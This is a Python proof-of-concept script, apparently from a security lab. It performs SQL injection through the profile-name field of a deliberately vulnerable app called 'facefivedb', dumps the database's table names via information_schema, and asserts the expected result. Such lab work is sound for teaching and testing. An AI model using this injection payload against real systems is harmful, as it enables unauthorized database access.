#!/usr/bin/env python3
import requests, sys
from interface import *
from bs4 import BeautifulSoup

if len(sys.argv) != 2:
    print(f"Usage: {__file__} server_url")
    sys.exit(-1)

url = sys.argv[1]

db_name = "facefivedb"

username = 'asdf'
password = 'asdf'

session = requests.Session()

reset_app(session, url)
register(session, url, username, password)

# Update profile
payload = f"""', about=(
    SELECT tables
    FROM (
        SELECT "" AS g, group_concat(table_name) AS tables
        FROM (
            SELECT table_name
            FROM information_schema.tables
            WHERE table_schema = 'facefivedb'
        ) AS T2
        GROUP BY g
    )AS T1)
WHERE username = '{username}'#"""

r = update_profile(session, url, password=password, name=payload)

# Check if we succeeded updating the profile
assert f"Succesfully updated user {username} profile" in r.text

r = get_profile(session, url)

# Parse response
soup = BeautifulSoup(r.text, 'html.parser')

form = soup.find_all("form")
assert len(form) == 1

form = form[0]

about_text = form.find_all(id="aboutInput")[0].text
tables_array = about_text.split(",")

existing_tables = [
    "Users",
    "Posts",
    "Friends",
    "FriendsRequests"
]

for tablename in tables_array:
    assert tablename in existing_tables
    print(f"[+] Got table {tablename}")

assert len(tables_array) == len(existing_tables)

print("[+] Got all tables in the database!")

session.close()
